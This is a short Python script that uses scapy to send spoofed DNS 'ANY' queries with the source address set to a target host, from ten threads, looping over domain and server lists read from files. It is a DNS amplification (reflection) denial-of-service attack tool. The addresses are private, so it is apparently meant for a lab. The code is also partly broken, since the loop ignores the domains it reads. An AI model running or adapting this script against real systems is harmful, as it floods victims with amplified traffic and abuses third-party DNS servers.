# !/usr/bin/env python


import logging
import threading
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import UDP, IP

target = "172.20.0.6"  # Target host
nameserver = "172.20.0.2"  # DNS server
domain = "google.com"  # Some domain name like "google.com" etc.

request_count = 10  # times of request


def filereader(file):
    with open(file, "r") as pointer:
        file_list = pointer.read()
        data = file_list.split()
    return data


domains = filereader('DOMAINS.txt')
nameservers = filereader('SERVERS.txt')


def build(domain: string, nameserver: string):
    ip = IP(src=target, dst=nameserver)
    udp = UDP(dport=53)
    dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype=255))
    request = (ip / udp / dns)
    return request


def thread_function(name):
    for j in domains:
        print(j)
        send(build(domain, nameserver))


if __name__ == "__main__":
    format = "%(asctime)s: %(message)s"
    logging.basicConfig(format=format, level=logging.INFO,
                        datefmt="%H:%M:%S")

    threads = list()
    for index in range(10):
        logging.info("Main    : create and start thread %d.", index)
        x = threading.Thread(target=thread_function, args=(index,))
        threads.append(x)
        x.start()

    for index, thread in enumerate(threads):
        logging.info("Main    : before joining thread %d.", index)
        thread.join()
        logging.info("Main    : thread %d done", index)
